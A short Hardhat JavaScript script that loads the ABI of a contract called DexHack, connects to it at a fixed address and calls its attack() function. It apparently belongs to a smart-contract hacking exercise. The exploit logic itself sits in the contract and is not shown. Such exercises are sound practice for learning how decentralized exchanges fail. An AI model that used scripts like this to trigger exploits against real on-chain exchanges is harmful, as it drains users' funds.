const hre = require("hardhat");
const hackABI = require("../artifacts/contracts/DexHack.sol/DexHack.json").abi;

async function main() {

    const [deployer] = await hre.ethers.getSigners();
    console.log("Attacking using MetaMask account:", deployer.address); 

    const hackAddress = "0x92317BDAb5a62757cce024628042B7bd5143351A"
    const dexHack = new hre.ethers.Contract(hackAddress, hackABI, deployer);

    const result = await dexHack.attack();
    await result.wait();

    console.log("Attack executed, transaction hash:", result.hash);
  }

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });